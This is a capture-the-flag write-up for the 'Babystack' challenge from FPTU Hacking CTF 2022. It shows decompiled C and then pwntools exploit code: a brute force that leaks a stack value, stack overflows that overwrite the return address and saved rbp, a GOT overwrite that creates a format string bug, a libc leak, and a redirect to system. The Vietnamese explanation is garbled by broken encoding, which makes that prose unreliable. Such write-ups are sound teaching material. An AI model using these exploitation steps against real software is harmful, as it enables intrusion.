# [Babystack - FPTU Hacking CTF 2022]
```C
#include <stdio.h>
#include <stdbool.h>


void timeout(void) {
    puts("Timeout");
                        /* WARNING: Subroutine does not return */
    exit(1);
}


int init() {
    int iVar1;

    signal(0xe, timeout);
    alarm(0x80);
    setvbuf(stdin, (char *)0x0, 2, 0);
    setvbuf(stdout, (char *)0x0, 2, 0);
    iVar1 = setvbuf(stderr, (char *)0x0, 2, 0);
    return iVar1;
}

void read_input(void *param_1, unsigned int param_2) {
    int iVar1;
    size_t sVar2;

    sVar2 = read(0, param_1, (unsigned long)param_2);
    iVar1 = (int)sVar2;
    if (iVar1 < 0) {
        puts("Read error");
        /* WARNING: Subroutine does not return */
        exit(-1);
    }
    if (*(char *)((long)param_1 + (long)iVar1 + -1) == '\n') {
        *(char *)((long)param_1 + (long)iVar1 + -1) = 0;
    }
    return;
}

int copy(char *dst, char *src) {
    int iVar1;
    char local_88[128];

    printf("Copy :");
    read_input(local_88, 0x3f);
    strcpy((char *)dst, local_88);
    iVar1 = puts("Your input was copied!");
    return iVar1;
}

undefined8 main() {
    int iVar1;
    char *src;
    char local_78[64];
    undefined8 local_38;
    undefined8 local_30;
    char local_28[28];
    int local_c;

    init();
    local_c = open("/dev/urandom", 0);
    read(local_c, &local_38, 0x10);
    password._0_8_ = local_38;
    password._8_8_ = local_30;
    close(local_c);
    while (true) {
        write(1, &DAT_001020bc, 2);
        src = local_28;
        read(0, src, 0x10);
        if (local_28[0] == (char)0x32)
            break;
        if (local_28[0] == (char)0x33) {
            if (logged_in == 0) {
                puts("You are not logged in");
            }
            else {
                copy(local_78, src);
            }
        }
        else if (local_28[0] == (char)0x31) {
            if (logged_in == 0) {
                login(&local_38);
            }
            else {
                logged_in = 0;
            }
        }
        else {
            puts("Invalid choice");
        }
    }
    if (logged_in == 0) {
        puts("I don\'t trust non-user");
        /* WARNING: Subroutine does not return */
        exit(0);
    }
    iVar1 = memcmp(&local_38, password, 0x10);
    if (iVar1 != 0) {
        /* WARNING: Subroutine does not return */
        __stack_chk_fail();
    }
    return 0;
}

undefined8 check_password(long param_1, long param_2, int param_3) {
    undefined8 uVar1;
    int local_10;
    int local_c;

    local_c = 0;
    for (local_10 = 0; (local_10 < param_3 && (*(char *)(param_2 + local_10) != '\0'));
         local_10 = local_10 + 1) {
        local_c = local_c + ((unsigned int param_2) * (byte *)(param_2 + local_10) - (unsigned int param_2) * (byte *)(param_1 + local_10));
    }
    if (local_c == 0) {
        uVar1 = 1;
    }
    else {
        if (0 < local_c) {
            puts("Your password is too small!");
        }
        if (local_c < 0) {
            puts("Your password is too large!");
        }
        uVar1 = 0;
    }
    return uVar1;
}

void login(undefined8 param_1) {
    int iVar1;
    size_t sVar2;
    char local_88[128];

    printf("Your password:");
    read_input(local_88, 0x80);
    sVar2 = strlen(local_88);
    iVar1 = check_password(local_88, param_1, sVar2 & 0xffffffff);
    if (iVar1 == 0) {
        attempt = attempt + 1;
        if (0xe6 < attempt) {
            puts("Too many login attempts");
            /* WARNING: Subroutine does not return */
            exit(0);
        }
        puts("Failed !");
    }
    else {
        logged_in = 1;
        puts("Login Succeeded !");
    }
    return;
}
```
Checksec em n?? xem:
![image](https://user-images.githubusercontent.com/54637811/176080985-b8f2372d-daa7-4c7c-aa34-0a08d0ef745f.png)

Ph??n t??ch th?? b??i n??y c?? 2 ch???c n??ng ch??nh, login v?? copy, 1 s??? k???t lu???n nh?? sau:
* ?????u ti??n n?? ?????c 16 bytes m???t kh???u random r???i ????? tr??n bss v?? stack
* Login ??o??n ????ng 16 bytes l?? ??n, nh??ng n???u ?????c k??? h??m check_password th?? ch??? c???n login("\n") l?? ???????c.
* H??m check_password so s??nh theo ????? d??i c???a input ch??? kh??ng ph???i so s??nh 16 bytes, d??? ?????n b??? leak 1 s??? th???ng tin tr??n stack. 
* H??m copy d??ng `strcpy`, overflow l?? c??i ch???c. ????? ?? th?? con tr??? input c???a h??m `login` l?? `[rbp-0x80]` v?? c???a h??m `copy` l?? `[rbp-0x80]`, nh??ng h??m ????? d??i l???n nh???t c???a input c???a h??m `copy` l?? 0x3f, c??n `login` l?? 0x80. T???c l?? ta ghi ??o???n payload c???n overflow b???ng h??m `login` xong ???? d??ng h??m `copy`. H??m `copy` copy v??o ?????a ch??? `[rbp-0x70]`, t???c l?? ta ghi ???? ???????c old rbp v?? return address.
* Khi ????ng nh???p th?? n?? c??n c?? 1 ??o???n th??ng b??o: `puts("Your password is too small!");` v?? `puts("Your password is too large!");`. Ngh?? ngay ?????n bruteforce tr??n stack, nh??ng do gi???i h???n s??? l???n ????ng nh???p sai n??n vi???t thu???t to??n c???n th???n t?? l?? ??n.

????y l?? ??o???n leak 16 byte 
```python
leak_canary = b''
for i in range(16):
    low = 1
    high = 255
    
    while True:
        j = (low + high) // 2
        login(leak_canary+j.to_bytes(1, 'little')+b'\n')
        recv = r.recvline()
        if b'Login Succeeded !\n' == recv:
            leak_canary += j.to_bytes(1, 'little')
            logout()
            break
        elif b'Your password is too small!\n' == recv:
            low = j
        elif b'Your password is too large!\n' == recv:
            high = j
```

Ti???p theo l?? leak binary base. Ta th???y password ??? [rbp-0x30], ta ???????c ph??p ghi 10 byte v??o [rbp-0x20], ??? [rbp-0x18] c?? m???t ?????a ch??? c???a binary. Easy to leak
![image](https://user-images.githubusercontent.com/54637811/176096021-de3722d3-fd21-4b6e-8855-72f63b5d9f16.png)

B???t ?????u exploit:
```python
payload = b'a'*0x40 + leak_canary + b'a'*0x28 + p64(bin.address+0x14ad)[:-2]
login(payload)
login(b'\n')
copy(b'a')
logout()
```
M???c ????ch l?? ghi ???? return address ?????n ?????a ch??? Base + 0x14ad, ?????a ch??? n??y n???m trong h??m `copy`. Ti???p theo s??? l?? ghi ???? old rbp ????? n?? tr??? t???i `bin.got['strcpy']+0x80`. Nh??ng tr?????c khi l???p l???i b?????c tr??n, ta ph???i x??a 1 s??? ch??? 'a' ??? old rbp do b?????c tr??n.
```python
payload = b'a'*0x40 + leak_canary + b'a'*0x27 + b'\n'
r.sendafter(b'> ', b'1\n')
r.sendafter(b'Your password:', payload)
login(b'\n')
copy(b'a')
r.sendafter(b'> ', b'1\n')

payload = b'a'*0x40 + leak_canary + b'a'*0x20 + p64(bin.got['strcpy']+0x80)
r.sendafter(b'> ', b'1\n')
r.sendafter(b'Your password:', payload)
login(b'\n')
copy(b'a')
r.sendafter(b'> ', b'1\n')
```
Ok b??y gi??? tho??t v??ng l???p v?? ch????ng tr??nh s??? return v??? ?????a ch??? Base + 0x14ad
![image](https://user-images.githubusercontent.com/54637811/176096882-604c214e-0ff9-43d0-9ccf-ca1d0e364ed1.png)

rbp ??ang b???ng `bin.got['strcpy']+0x80`, do ???? ta c?? th??? ghi tr??n GOT
```python
payload = p64(bin.symbols['login']) + p64(bin.symbols['login']) + p64(bin.plt['write']+6) + \
        p64(bin.plt['printf']+6)
r.sendafter(b'Copy :', payload)
```
`strcpy`, `puts` s??? thay b???ng h??m `login`, `strlen` s??? thay b???ng `printf` ????? c?? **Format string**.
Lu???ng th???c thi s??? ch???y ti???p ?????n h??m `strcpy` (???? b??? ghi ???? th??nh `login`). Trong h??m `login` s??? nh???n input v?? ????a v??o `strlen`, ta s??? leak ???????c Libc
```python
payload = b'%4$p'.ljust(8, b'\x00') + p64(bin.symbols['copy'])
r.sendafter(b'Your password:', payload)
libc.address = int(r.recv(14), 16) - 0x5ed700
log.success('Libc base: %#x' % libc.address)
```

H??m login s??? g???i h??m puts, ch??ng ta s??? c?? **Format string** v?? h???n.
K???t th??c b??i to??n b???ng ??o???n payload ghi ???? `strlen@got` th??nh ?????a ch??? `system`.
